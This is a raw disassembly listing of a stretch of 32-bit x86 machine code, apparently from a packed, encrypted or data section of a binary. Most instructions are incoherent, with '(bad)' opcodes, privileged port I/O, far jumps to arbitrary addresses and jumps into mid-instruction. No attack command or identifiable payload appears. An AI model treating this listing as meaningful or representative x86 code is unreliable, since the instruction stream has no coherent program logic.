  413edc:	adc    al,0x95
  413ede:	mov    esi,0x2a0be4ef
  413ee3:	or     al,0x6d
  413ee5:	mov    DWORD PTR [ecx-0x18],ebx
  413ee8:	dec    ecx
  413ee9:	enter  0x6ab,0x2b
  413eed:	pusha  
  413eee:	push   eax
  413eef:	or     DWORD PTR [ebx+0x52],ecx
  413ef2:	dec    edi
  413ef3:	dec    eax
  413ef4:	push   edx
  413ef5:	xchg   BYTE PTR [ecx+0x1d],dl
  413ef8:	xchg   ebp,eax
  413ef9:	int3   
  413efa:	pop    esi
  413efb:	in     al,dx
  413efc:	xchg   BYTE PTR [edx+0x6a93a8d4],ch
  413f02:	cmp    DWORD PTR [ebp+0x6eb4e609],ebx
  413f08:	push   edx
  413f09:	lods   al,BYTE PTR ds:[esi]
  413f0a:	mov    DWORD PTR [ecx-0x6f83fe0d],esi
  413f10:	loope  0x413e9d
  413f12:	retf   
  413f13:	jo     0x413ed0
  413f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f16:	mov    al,0x5e
  413f18:	mov    cs,WORD PTR [esi+eiz*2+0x1a]
  413f1c:	cs (bad) 
  413f1f:	xchg   ebx,eax
  413f20:	push   edx
  413f21:	out    0xf3,al
  413f23:	das    
  413f24:	cmp    eax,0x5135200a
  413f29:	add    esp,DWORD PTR [eax+0x17]
  413f2c:	add    eax,eax
  413f2e:	mul    dh
  413f30:	ds fucomi st,st(5)
  413f33:	inc    esp
  413f34:	dec    eax
  413f35:	xor    ch,ch
  413f37:	and    al,BYTE PTR [edi-0x21]
  413f3a:	retf   
  413f3b:	jle    0x413f17
  413f3d:	sub    eax,0xaed35f51
  413f42:	test   esi,edi
  413f44:	sub    eax,0x87b04685
  413f49:	pop    ebp
  413f4a:	xor    DWORD PTR [ecx+0x33],0x19bb06c1
  413f51:	daa    
  413f52:	add    eax,0xbc823da0
  413f57:	stos   DWORD PTR es:[edi],eax
  413f58:	cmp    DWORD PTR [ebx+0x69],0x58
  413f5c:	hlt    
  413f5d:	ja     0x413efc
  413f5f:	mov    ds:0x5256714b,eax
  413f64:	sub    ebx,ebp
  413f66:	push   ds
  413f67:	cmp    DWORD PTR [esp+ecx*1],esp
  413f6a:	xor    ecx,DWORD PTR [ecx]
  413f6c:	mov    ecx,0x301a37d5
  413f71:	add    ch,bh
  413f73:	and    bh,BYTE PTR [edx+0x11eb65bc]
  413f79:	mov    cl,0x7a
  413f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f7c:	cdq    
  413f7d:	and    eax,0x825f2851
  413f82:	mov    ebx,0xafe4ff2a
  413f87:	add    dh,BYTE PTR [edi]
  413f89:	dec    ecx
  413f8a:	popa   
  413f8b:	in     al,dx
  413f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f8d:	aam    0x44
  413f8f:	ret    0x190b
  413f92:	xchg   ebx,eax
  413f93:	add    eax,0x9f3950c
  413f98:	jge    0x413fd1
  413f9a:	lds    esi,FWORD PTR gs:[ebp+0x598dcd35]
  413fa1:	jecxz  0x413f65
  413fa3:	sbb    BYTE PTR [ecx+0x3724ba47],dh
  413fa9:	adc    ah,BYTE PTR [ebx-0x29ecbf4f]
  413faf:	les    edx,FWORD PTR [ecx]
  413fb1:	dec    ebp
  413fb2:	sub    eax,DWORD PTR [ebx]
  413fb4:	sub    edx,esp
  413fb6:	add    ah,BYTE PTR [ebx+0xe]
  413fb9:	lahf   
  413fba:	jno    0x413f58
  413fbc:	loopne 0x413ff5
  413fbe:	or     ecx,ebp
  413fc0:	out    dx,eax
  413fc1:	fwait
  413fc2:	sti    
  413fc3:	xor    eax,ebx
  413fc5:	and    bl,BYTE PTR [ecx]
  413fc7:	push   ds
  413fc8:	or     edi,DWORD PTR [ebp-0x3f]
  413fcb:	xchg   esp,eax
  413fcc:	mov    esp,0x949e4c12
  413fd1:	in     al,0xcb
  413fd3:	in     eax,0x79
  413fd5:	or     bl,BYTE PTR [ebx-0x672ca175]
  413fdb:	addr16 dec edx
  413fdd:	lods   eax,DWORD PTR ds:[esi]
  413fde:	xchg   ebp,eax
  413fdf:	dec    esi
  413fe0:	shl    BYTE PTR [eax-0x29],cl
  413fe3:	jno    0x413ff8
  413fe5:	sbb    edi,DWORD PTR [edx-0x5]
  413fe8:	jb     0x41403e
  413fea:	inc    ebx
  413feb:	or     eax,0xa4b596a7
  413ff0:	cs das 
  413ff2:	aam    0xb9
  413ff4:	std    
  413ff5:	out    dx,al
  413ff6:	mov    BYTE PTR [esi-0xc],dl
  413ff9:	out    0x21,eax
  413ffb:	(bad)  
  413ffd:	jnp    0x41405d
  413fff:	call   0xeedc06e7
  414004:	loop   0x414028
  414006:	ja     0x413fd4
  414008:	mov    bl,0x25
  41400a:	out    0x16,al
  41400c:	xor    eax,esi
  41400e:	mov    esi,DWORD PTR [edx]
  414010:	dec    DWORD PTR [edx-0x61]
  414013:	add    al,0x87
  414015:	out    0xb7,eax
  414017:	inc    esp
  414018:	cld    
  414019:	dec    ebp
  41401a:	es pusha 
  41401c:	push   ebp
  41401d:	adc    BYTE PTR [edx-0x1b20fe00],bh
  414023:	sbb    DWORD PTR [edi-0x4d],ecx
  414026:	dec    ecx
  414027:	lock pop eax
  414029:	dec    esp
  41402a:	outs   dx,BYTE PTR ds:[esi]
  41402b:	add    BYTE PTR [ebx+0x6e8049c1],ch
  414031:	hlt    
  414032:	lods   eax,DWORD PTR ds:[esi]
  414033:	int3   
  414034:	jg     0x4140b5
  414036:	dec    ebx
  414037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414038:	sti    
  414039:	enter  0x87a8,0xce
  41403d:	pop    ecx
  41403e:	sub    DWORD PTR [esi],ecx
  414040:	jg     0x414020
  414042:	fs je  0x4140ae
  414045:	(bad)  
  414046:	pusha  
  414047:	adc    eax,ebx
  414049:	(bad)  
  41404a:	jo     0x414068
  41404c:	cmp    eax,0x709f6f6
  414051:	popf   
  414052:	mov    ah,0x61
  414054:	push   ebx
  414055:	shr    DWORD PTR [ebx+0x31656ed9],1
  41405b:	cwde   
  41405c:	jnp    0x414047
  41405e:	mov    esp,0xd044eed0
  414063:	push   ds
  414064:	mov    ebx,0x58e7e2de
  414069:	dec    ecx
  41406a:	neg    DWORD PTR [eax]
  41406c:	add    DWORD PTR [ebp+0x33f5d0be],eax
  414072:	mov    ah,bl
  414074:	xchg   edi,eax
  414075:	push   ebx
  414076:	adc    al,BYTE PTR [eax+0x71]
  414079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41407a:	inc    edx
  41407b:	pop    ss
  41407c:	pusha  
  41407d:	dec    ecx
  41407e:	loopne 0x414069
  414080:	pop    ds
  414081:	jecxz  0x4140a8
  414083:	push   edx
  414084:	xor    BYTE PTR [ecx-0x70],cl
  414087:	aad    0xf1
  414089:	xchg   esp,eax
  41408a:	leave  
  41408b:	repnz and edi,DWORD PTR es:[eax+0x3e9eaeed]
  414093:	js     0x4140f6
  414095:	push   ebp
  414096:	adc    eax,eax
  414098:	jnp    0x414032
  41409a:	push   es
  41409b:	mov    al,0x6f
  41409d:	mov    eax,ds:0xd026ee59
  4140a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140a3:	cmp    dl,0x8c
  4140a6:	hlt    
  4140a7:	test   al,0x86
  4140a9:	cmp    edi,DWORD PTR [edx+0x4c]
  4140ac:	jmp    0x12f1:0x7fcc26d5
  4140b3:	xchg   BYTE PTR [ebx-0x51209a7b],dl
  4140b9:	call   0x2e98:0x114fbd19
  4140c0:	add    esi,DWORD PTR [edx-0x7828849a]
  4140c6:	inc    bl
  4140c8:	or     eax,0x8bdbd9db
  4140cd:	mov    esp,0x5a300edf
  4140d2:	pop    eax
  4140d3:	pop    esi
  4140d4:	push   eax
  4140d5:	push   0xffffffdd
  4140d7:	(bad)  
  4140d8:	pushf  
  4140d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140da:	jp     0x414125
  4140dc:	ja     0x4140bd
  4140de:	and    al,0xd4
  4140e0:	adc    dh,BYTE PTR [eax+0x64]
  4140e3:	(bad)  
  4140e4:	mov    esp,0x8d8c233f
  4140e9:	xchg   BYTE PTR ss:[esi-0x15],bl
  4140ed:	pop    eax
  4140ee:	std    
  4140ef:	les    ebx,FWORD PTR [ecx+0x4e1d0a11]
  4140f5:	mov    ds:0xb2fd3346,eax
  4140fa:	mov    bl,0x83
  4140fc:	aad    0x57
  4140fe:	pop    ss
  4140ff:	into   
  414100:	mov    edx,0xe4fb0ab1
  414105:	cmc    
  414106:	in     eax,0x4e
  414108:	push   esp
  414109:	ret    0xed19
  41410c:	inc    ebp
  41410d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41410e:	aad    0x69
  414110:	cmc    
  414111:	dec    esi
  414112:	or     DWORD PTR [esi+eiz*4-0x1886d5e9],edx
  414119:	cmp    ch,ah
  41411b:	and    BYTE PTR [edx-0x74],al
  41411e:	das    
  41411f:	lock xor eax,0x4303db90
  414125:	sub    edx,DWORD PTR [ebx+eax*2]
  414128:	test   BYTE PTR [ebx-0x55],dl
  41412b:	mov    es,ecx
  41412d:	push   0xffffffe3
  41412f:	call   0xdecb:0xda9d40b1
  414136:	xchg   edi,eax
  414137:	inc    esi
  414138:	sbb    al,0xb0
  41413a:	sbb    eax,0x96d8926b
  41413f:	lea    ebp,[ecx+0x45]
  414142:	fsub   QWORD PTR [ecx+0x175d4014]
  414148:	add    eax,0x15c42bf1
  41414d:	sbb    BYTE PTR [eax],0x7c
  414150:	cmp    al,0xc2
  414152:	dec    ebp
  414153:	sub    al,BYTE PTR [ebp+0x33]
  414156:	ret    0xb415
  414159:	push   es
  41415a:	outs   dx,BYTE PTR ds:[esi]
  41415b:	add    al,0xfb
  41415d:	push   esi
  41415e:	pop    ebp
  41415f:	dec    ebx
  414160:	fs sbb ecx,ecx
  414163:	call   0x3db3e0ef
  414168:	sbb    BYTE PTR [edi],bh
  41416a:	lock dec ah
  41416d:	in     eax,0xa7
  41416f:	pop    ebp
  414170:	or     BYTE PTR [ecx+0x45e2b3e0],dh
  414176:	gs (bad) 
  414178:	jg     0x41410e
  41417a:	xor    DWORD PTR [eax+0x5a],ebp
  41417d:	cmp    DWORD PTR [ecx+0x1c],ecx
  414180:	out    0x49,eax
  414182:	or     bl,BYTE PTR [edx-0x4a]
  414185:	pop    edx
  414186:	loope  0x41410e
  414188:	cmp    edx,DWORD PTR [eax]
  41418a:	pop    ecx
  41418b:	mov    cl,0xf9
  41418d:	jnp    0x41419f
  41418f:	jb     0x4141f4
  414191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414192:	or     eax,0x5f989d03
  414197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414198:	mov    WORD PTR [esi],ds
  41419a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41419b:	add    bh,cl
  41419d:	jp     0x414141
  41419f:	test   esp,esp
  4141a1:	jmp    0xc2afab6c
  4141a6:	mov    eax,0xe9d0da81
  4141ab:	aas    
  4141ac:	push   esi
  4141ad:	sti    
  4141ae:	xor    eax,0x48b48118
  4141b3:	xlat   BYTE PTR ds:[ebx]
  4141b4:	loop   0x4141d3
  4141b6:	hlt    
  4141b7:	xor    ebx,DWORD PTR [ecx-0x4b92f5cf]
  4141bd:	repz inc esp
  4141bf:	jl     0x41419d
  4141c1:	fiadd  DWORD PTR [esi+eiz*4-0x7ec4bc49]
  4141c8:	or     edi,DWORD PTR ds:0x2bf42d4d
  4141ce:	cld    
  4141cf:	jg     0x414235
  4141d1:	jmp    0xe308ba25
  4141d6:	sbb    esp,DWORD PTR [edi-0x6b]
  4141d9:	sub    al,ah
  4141db:	test   BYTE PTR ds:0x766fcb71,bh
  4141e1:	xchg   esi,eax
  4141e2:	fstp   TBYTE PTR [edi-0x1c95f567]
  4141e8:	sub    eax,edx
  4141ea:	mov    DWORD PTR [edx+0x23],ebp
  4141ed:	xor    DWORD PTR [ebp+0x51423198],eax
  4141f3:	sbb    edx,edx
  4141f5:	repnz int3 
  4141f7:	xchg   edi,eax
  4141f8:	cmc    
  4141f9:	mov    ebp,esp
  4141fb:	jle    0x41425e
  4141fd:	pop    edx
  4141fe:	mov    ebp,0xab4cb579
  414203:	jno    0x414219
  414205:	mov    al,ds:0x711e56dc
  41420a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41420b:	gs xchg edi,eax
  41420d:	out    dx,al
  41420e:	je     0x414289
  414210:	out    dx,al
  414211:	push   esp
  414212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414213:	in     eax,dx
  414214:	mov    DWORD PTR [esi],ecx
  414216:	sbb    al,0x55
  414218:	iret   
  414219:	mov    esi,0x49088fbc
  41421e:	jbe    0x41427f
  414220:	bound  edx,QWORD PTR [ebx+0x1889346]
  414226:	and    eax,0x9f140e5a
  41422b:	repz and eax,DWORD PTR ds:0xbe71f531
  414232:	or     al,0x3
  414234:	dec    esi
  414235:	inc    edx
  414236:	adc    cl,cl
  414238:	adc    ebx,DWORD PTR [ebx-0x179c7e01]
  41423e:	cmp    al,0x7f
  414240:	and    DWORD PTR [edx+0x17],esp
  414243:	mov    al,ds:0x9760ceea
  414248:	(bad)  
  414249:	hlt    
  41424a:	add    al,0xbd
  41424c:	ins    BYTE PTR es:[edi],dx
  41424d:	dec    esp
  41424e:	or     BYTE PTR [edx-0x7b],dl
  414251:	jmp    0x41425d
  414253:	leave  
  414254:	leave  
  414255:	mov    ah,0xf9
  414257:	cmp    ebp,DWORD PTR [ebx-0x6d]
  41425a:	sub    dl,0xb8
  41425d:	adc    DWORD PTR [edx+0x54],0x6023d514
  414264:	and    esi,DWORD PTR [edi-0x5f]
  414267:	mov    eax,0x371fb1a8
  41426c:	push   es
  41426d:	and    DWORD PTR [esi+0x73463eca],esp
  414273:	(bad)  
  414275:	pop    eax
  414276:	jns    0x4142d3
  414278:	cmp    BYTE PTR [edx],bl
  41427a:	bound  eax,QWORD PTR [ebx-0xa]
  41427d:	mov    eax,0x411c9468
  414282:	push   eax
  414283:	(bad)  [ebx-0x323206a5]
  414289:	jg     0x41423e
  41428b:	out    0x72,al
  41428d:	jl     0x41424f
  41428f:	mov    BYTE PTR [eax+eiz*4-0x29],dh
  414293:	push   ebp
  414294:	jmp    0x6a6f1039
  414299:	sbb    eax,0x10031775
  41429e:	push   ecx
  41429f:	inc    edi
  4142a0:	fnsavew [eax-0x7f6dc7f8]
  4142a7:	pop    ebx
  4142a8:	fs mov al,0x59
  4142ab:	sub    BYTE PTR [esi+eax*8-0x3],bl
  4142af:	fbld   TBYTE PTR [edi-0x25]
  4142b2:	dec    ebp
  4142b3:	mov    edi,0xac70c6d2
  4142b8:	sub    dl,cl
  4142ba:	or     ebx,ebx
  4142bc:	in     al,dx
  4142bd:	outs   dx,BYTE PTR ds:[esi]
  4142be:	popa   
  4142bf:	ins    BYTE PTR es:[edi],dx
  4142c0:	jno    0x414253
  4142c2:	and    al,0x46
  4142c4:	mov    dh,0xfe
  4142c6:	inc    DWORD PTR [ebp-0x30]
  4142c9:	sub    ah,ch
  4142cb:	push   cs
  4142cc:	xchg   DWORD PTR [eax-0x3c],eax
  4142cf:	outs   dx,BYTE PTR ds:[esi]
  4142d0:	mov    DWORD PTR [ebp-0x4e96b16e],ebp
  4142d6:	and    ch,bh
  4142d8:	loopne 0x41434f
  4142da:	jecxz  0x414338
  4142dc:	fwait
  4142dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142de:	push   0xffffffc7
  4142e0:	mov    dl,BYTE PTR [ebx-0x6352157e]
  4142e6:	xchg   ecx,eax
  4142e7:	out    dx,al
  4142e8:	std    
  4142e9:	mov    edi,0x2394458
  4142ee:	cmp    al,bh
  4142f0:	int3   
  4142f1:	inc    esi
  4142f2:	mov    cl,0xfa
  4142f4:	add    bh,ah
  4142f6:	push   esi
  4142f7:	pop    ecx
  4142f8:	scas   eax,DWORD PTR es:[edi]
  4142f9:	dec    edi
  4142fa:	in     eax,0xaf
  4142fc:	ds and al,0xc5
  4142ff:	int    0x99
  414301:	ror    cl,1
  414303:	enter  0x7ae5,0xb0
  414307:	stc    
  414308:	sub    bl,BYTE PTR [ebp-0x5f]
  41430b:	adc    dh,BYTE PTR [eax+0x2b]
  41430e:	js     0x414303
  414310:	out    0x40,eax
  414312:	outs   dx,DWORD PTR ds:[si]
  414314:	or     ah,BYTE PTR [esi+0x44bb151a]
  41431a:	jmp    0x414373
  41431c:	dec    esp
  41431d:	xor    DWORD PTR ds:0xd7b787f6,eax
  414323:	fnstenv [ebp+eax*8-0x625d5369]
  41432a:	clc    
  41432b:	and    BYTE PTR [edx+edx*2+0x2580012],ah
  414332:	lds    ebx,FWORD PTR ds:0x90921e9a
  414338:	sub    eax,0x21f54fe5
  41433d:	push   es
  41433e:	aas    
  41433f:	das    
  414340:	and    eax,0x97ba3c10
  414345:	clc    
  414346:	jb     0x4142f2
  414348:	jecxz  0x4143bd
  41434a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41434b:	scas   al,BYTE PTR es:[edi]
  41434c:	popf   
  41434d:	scas   eax,DWORD PTR es:[edi]
  41434e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41434f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414350:	test   eax,0xdb44233c
  414355:	xchg   DWORD PTR [ecx-0x111ff1e5],esi
  41435b:	jg     0x414364
  41435d:	mov    WORD PTR [ebp-0x79],ss
  414360:	dec    edx
  414361:	iret   
  414362:	xchg   edi,eax
  414363:	aaa    
  414364:	fisttp DWORD PTR [edi-0x14]
  414367:	or     ecx,ebx
  414369:	ja     0x41434c
  41436b:	aad    0xd4
  41436d:	pop    ss
  41436e:	mov    edx,0x1321cf09
  414373:	and    BYTE PTR [edx],dl
  414375:	mov    bl,0xe3
  414377:	mov    ch,0x6f
  414379:	xchg   ebx,eax
  41437a:	in     eax,0xf1
  41437c:	mov    ebx,0x7663285e
  414381:	iret   
  414382:	xchg   edi,eax
  414383:	scas   eax,DWORD PTR es:[edi]
  414384:	pop    esp
  414385:	repnz inc ebp
  414387:	push   ecx
  414388:	push   0xf3e4129
  41438d:	je     0x414367
  41438f:	add    edi,DWORD PTR [ebx+0x3e]
  414392:	mov    bh,BYTE PTR [ebp+0xc353227]
  414398:	popa   
  414399:	imul   edx,DWORD PTR [eax+0x2cef2717],0x537ff279
  4143a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143a4:	je     0x4143ad
  4143a6:	ins    DWORD PTR es:[edi],dx
  4143a7:	dec    esi
  4143a8:	call   0xf459872b
  4143ad:	mov    bl,0xa4
  4143af:	dec    edi
  4143b0:	mov    ebx,0xb4714774
  4143b5:	push   es
  4143b6:	in     al,dx
  4143b7:	mov    ds,WORD PTR [ebx+0x73]
  4143ba:	push   0x8117faab
  4143bf:	lock mov dl,bl
  4143c2:	stos   DWORD PTR es:[edi],eax
  4143c3:	loopne 0x4143c4
  4143c5:	pop    ecx
  4143c6:	(bad)  
  4143c7:	repnz test al,0x88
  4143ca:	stos   DWORD PTR es:[edi],eax
  4143cb:	push   edx
  4143cc:	jns    0x41435c
  4143ce:	fwait
  4143cf:	add    esp,DWORD PTR [eax+0x5f020041]
  4143d5:	fbstp  TBYTE PTR [edx+ecx*2+0x1b9ccc68]
  4143dc:	addr16 add al,bh
  4143df:	ror    DWORD PTR [edi],1
  4143e1:	jns    0x41439f
  4143e3:	sub    eax,0xc98cc7de
  4143e8:	sub    DWORD PTR [ecx],esp
  4143ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143eb:	shl    DWORD PTR [esi],0x91
  4143ee:	call   0xd545738f
  4143f3:	or     DWORD PTR [esi+0x7fa7da49],esp
  4143f9:	pop    ds
  4143fa:	adc    BYTE PTR [edx],al
  4143fc:	pop    esp
  4143fd:	int    0xed
  4143ff:	dec    edx
  414400:	jmp    0x32da6481
  414405:	or     eax,0x50ad6cd2
  41440a:	xor    dl,dl
  41440c:	jmp    0xc0d787e0
  414411:	fstp   QWORD PTR [ecx-0x23c21693]
  414417:	test   BYTE PTR [ecx+ebp*2-0x14],ch
  41441b:	aam    0xae
  41441d:	mov    ds:0x827dd3b7,al
  414422:	mov    ch,BYTE PTR [ebx-0x7c]
  414425:	rcl    BYTE PTR [ebx+0x55],1
  414428:	sub    cl,bh
  41442a:	ds mov ah,0x56
  41442d:	leave  
  41442e:	fiadd  DWORD PTR ds:0xcf3c15d9
  414434:	mov    bl,0xe5
  414436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414437:	int3   
  414438:	push   ebp
  414439:	mov    ch,0x74
  41443b:	push   DWORD PTR [ecx-0x6fd0a805]
  414441:	fmul   DWORD PTR [edi]
  414443:	xor    eax,0xb8b5abea
  414448:	scas   al,BYTE PTR es:[edi]
  414449:	into   
  41444a:	les    ebp,FWORD PTR [edx]
  41444c:	loope  0x4143fa
  41444e:	and    ch,al
  414450:	mov    ebp,0xf99cb43e
  414455:	aam    0x5d
  414457:	jp     0x414443
  414459:	adc    ebx,eax
  41445b:	adc    dh,ch
  41445d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41445e:	int    0xe2
  414460:	outs   dx,BYTE PTR ds:[esi]
  414461:	mov    esi,0xa35c5264
  414466:	or     al,0x56
  414468:	mov    esi,DWORD PTR [ebp+0x3355bcf8]
  41446e:	jge    0x41449f
  414470:	nop
  414471:	in     eax,0x1c
  414473:	(bad)  
  414474:	fst    st(5)
  414476:	add    eax,0xeeeab72
  41447b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41447c:	adc    al,0x4d
  41447e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41447f:	jb     0x4144ce
  414481:	inc    ecx
  414482:	adc    BYTE PTR [eax+0x7f],ah
  414485:	hlt    
  414486:	cdq    
  414487:	(bad)  
  414488:	fiadd  WORD PTR [eax-0x6b2b639f]
  41448e:	cld    
  41448f:	hlt    
  414490:	pop    ebx
  414491:	fsubp  st(3),st
  414493:	int3   
  414494:	mov    edx,0x984f326b
  414499:	or     BYTE PTR [esi-0x1a18d1c7],al
  41449f:	neg    DWORD PTR [edx-0x73a7b78f]
  4144a5:	xchg   esi,eax
  4144a6:	in     al,dx
  4144a7:	loope  0x41443e
  4144a9:	lods   al,BYTE PTR ds:[esi]
  4144aa:	out    0x3c,eax
  4144ac:	pop    edi
  4144ad:	xor    al,0x88
  4144af:	xor    BYTE PTR [ecx-0x589e583d],bl
  4144b5:	xchg   edi,eax
  4144b6:	test   al,0x1b
  4144b8:	and    ecx,DWORD PTR [ebp+0x34]
  4144bb:	mov    ebx,0xdffa06b0
  4144c0:	je     0x414523
  4144c2:	push   edi
  4144c3:	fisttp DWORD PTR [eax]
  4144c5:	inc    esp
  4144c6:	aaa    
  4144c7:	push   edx
  4144c8:	jno    0x4144c3
  4144ca:	cli    
  4144cb:	push   ds
  4144cc:	and    DWORD PTR [edi-0x676d03e7],esp
  4144d2:	xchg   DWORD PTR [ecx+0x19],ecx
  4144d5:	fbstp  TBYTE PTR [eax+ecx*2-0x49]
  4144d9:	out    dx,al
  4144da:	inc    edi
  4144db:	jno    0x41446a
  4144dd:	push   ebp
  4144de:	cmp    BYTE PTR [ebx+0x3f1c0b9c],bh
  4144e4:	xchg   esi,eax
  4144e5:	int    0xdc
  4144e7:	sub    al,0x4a
  4144e9:	adc    DWORD PTR [ebx-0x1f],esp
  4144ec:	jge    0x41453c
  4144ee:	xor    esi,DWORD PTR [eax-0x3d547cd1]
  4144f4:	or     ah,BYTE PTR [eax-0x7dc678d6]
  4144fa:	mov    ebp,0x490c57fe
  4144ff:	into   
  414500:	dec    esi
  414501:	add    edx,edi
  414503:	sub    DWORD PTR [ecx],ecx
  414505:	mov    esi,0x93f3162f
  41450a:	mul    DWORD PTR [eax-0x41b6423b]
  414510:	dec    ebp
  414511:	xchg   ebp,eax
  414512:	or     al,0x2f
  414514:	pop    ebx
  414515:	cmp    BYTE PTR [ecx+ebp*2-0x3a],bl
  414519:	imul   ebp,DWORD PTR [ebx-0x581fd7ae],0x28
  414520:	push   0x13
  414522:	div    BYTE PTR [edi]
  414524:	jns    0x414543
  414526:	add    bh,dh
  414528:	pop    ss
  414529:	enter  0x65b4,0xd
  41452d:	xchg   edx,eax
  41452e:	sbb    al,0xae
  414530:	(bad)  
  414531:	cmp    al,cl
  414533:	inc    eax
  414534:	je     0x414579
  414536:	or     ebp,DWORD PTR [edx-0x7d]
  414539:	dec    ecx
  41453a:	push   esi
  41453b:	push   es
  41453c:	sbb    al,0xec
  41453e:	(bad)  
  41453f:	fistp  WORD PTR [eax-0x47]
  414542:	imul   esp,DWORD PTR [esi-0x44cf12d3],0xec9abf5
  41454c:	in     eax,dx
  41454d:	dec    ecx
  41454e:	in     al,0xea
  414550:	cmp    BYTE PTR [eax+0x59e0e79c],dl
  414556:	push   edi
  414557:	les    edx,FWORD PTR [esp+ebx*2-0x39]
  41455b:	mov    BYTE PTR [ebx+0x66],bh
  41455e:	mov    BYTE PTR [ecx-0x3d],bh
  414561:	ss test eax,0xb3b9fcdd
  414567:	fwait
  414568:	or     al,0x9a
  41456a:	xor    al,0x30
  41456c:	xor    bl,al
  41456e:	mov    esp,0x8e6f67e9
  414573:	jo     0x414547
  414575:	ins    BYTE PTR es:[edi],dx
  414576:	js     0x4145cb
  414578:	sub    eax,0xfcec904
  41457d:	cmp    BYTE PTR [esi+0x50],dh
  414580:	mov    esi,0xdde9d623
  414585:	stos   DWORD PTR es:[edi],eax
  414586:	mov    edi,0xe7a80506
  41458b:	jo     0x414522
  41458d:	cmp    BYTE PTR [ecx-0x32],cl
  414590:	aaa    
  414591:	sbb    dl,cl
  414593:	add    edx,DWORD PTR [ebx+0x59]
  414596:	mov    es,WORD PTR [ebx+0x6d]
  414599:	mov    ds:0x2c2cd3bd,al
  41459e:	cmc    
  41459f:	ins    DWORD PTR es:[edi],dx
  4145a0:	sahf   
  4145a1:	retf   0x894d
  4145a4:	push   ebp
  4145a5:	mov    WORD PTR [esi],ss
  4145a7:	inc    esp
  4145a8:	sub    al,0x7
  4145aa:	cli    
  4145ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145ac:	(bad)  
  4145ad:	xor    ch,al
  4145af:	add    DWORD PTR [edx-0x61],0xffffffb1
  4145b3:	xchg   esi,eax
  4145b4:	fisttp QWORD PTR [ebx-0x2edf3392]
  4145ba:	jae    0x4145bd
  4145bc:	jle    0x41457f
  4145be:	xchg   esi,eax
  4145bf:	add    al,0x70
  4145c1:	mov    ebx,0xe97ba16c
  4145c6:	cli    
  4145c7:	fs push ecx
  4145c9:	pusha  
  4145ca:	ror    edi,cl
  4145cc:	adc    al,0xc2
  4145ce:	mov    cl,0xd
  4145d0:	jge    0x41464a
  4145d2:	jne    0x414556
  4145d4:	jb     0x4145a3
  4145d6:	stc    
  4145d7:	xor    edi,eax
  4145d9:	imul   BYTE PTR [ecx]
  4145db:	fild   DWORD PTR [edi]
  4145dd:	jl     0x4145ba
  4145df:	mov    BYTE PTR [ecx],bl
  4145e1:	(bad)  
  4145e2:	mov    ah,0xa8
  4145e4:	pop    edi
  4145e5:	jge    0x41462e
  4145e7:	int3   
  4145e8:	aam    0xc0
  4145ea:	sbb    dh,BYTE PTR [esi+ebx*2-0x71e43a91]
  4145f1:	mov    al,ds:0xe60a515b
  4145f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f7:	inc    ebx
  4145f8:	adc    BYTE PTR ds:0x9eae1cf3,al
  4145fe:	punpckhdq mm1,QWORD PTR [esi+0x5d]
  414602:	out    0xe7,al
  414604:	call   FWORD PTR [ecx]
  414606:	add    BYTE PTR [edx+0x4c360676],0x34
  41460d:	gs gs or bl,bl
  414611:	dec    edi
  414612:	xchg   bl,dh
  414614:	(bad)  
  414615:	pop    ds
  414616:	out    0x28,al
  414618:	jbe    0x4145e8
  41461a:	daa    
  41461b:	jnp    0x41468b
  41461d:	mov    ebp,0xd3d3ecc8
  414622:	repz push edi
  414624:	in     eax,0x65
  414626:	(bad)  
  414627:	fidivr DWORD PTR [ecx+ecx*2-0x1b]
  41462b:	scas   eax,DWORD PTR es:[edi]
  41462c:	(bad)  
  41462d:	and    DWORD PTR [eax+0x35a62a22],edi
  414633:	lock adc BYTE PTR [ecx+0x5e5a640d],ch
  41463a:	jnp    0x4146ad
  41463c:	iret   
  41463d:	mov    ah,BYTE PTR ds:[ecx+0x4366c23f]
  414644:	cwde   
  414645:	lods   al,BYTE PTR ds:[esi]
  414646:	or     BYTE PTR [ebx-0x4029b71a],ch
  41464c:	cmp    ah,BYTE PTR [esi+0x4c2b5f66]
  414652:	(bad)  
  414653:	sar    edi,cl
  414655:	sub    BYTE PTR [eax],bl
  414657:	shl    BYTE PTR [esi+0x54f15612],1
  41465d:	sbb    BYTE PTR [edx-0x75140af0],0x3c
  414664:	push   esp
  414665:	or     al,0xe6
  414667:	in     eax,0x5f
  414669:	dec    edi
  41466a:	bound  ebp,QWORD PTR [eax-0x5bbdb6a3]
  414670:	mov    eax,0xbfae2d8a
  414675:	ds xchg esp,eax
  414677:	fnstsw WORD PTR [ebx]
  414679:	mov    eax,0xe733012e
  41467e:	jnp    0x41460a
  414680:	out    dx,al
  414681:	js     0x4146ac
  414683:	neg    ah
  414685:	outs   dx,BYTE PTR ds:[esi]
  414686:	stos   BYTE PTR es:[edi],al
  414687:	je     0x414629
  414689:	leave  
  41468a:	sbb    BYTE PTR [ebx-0x3d],ch
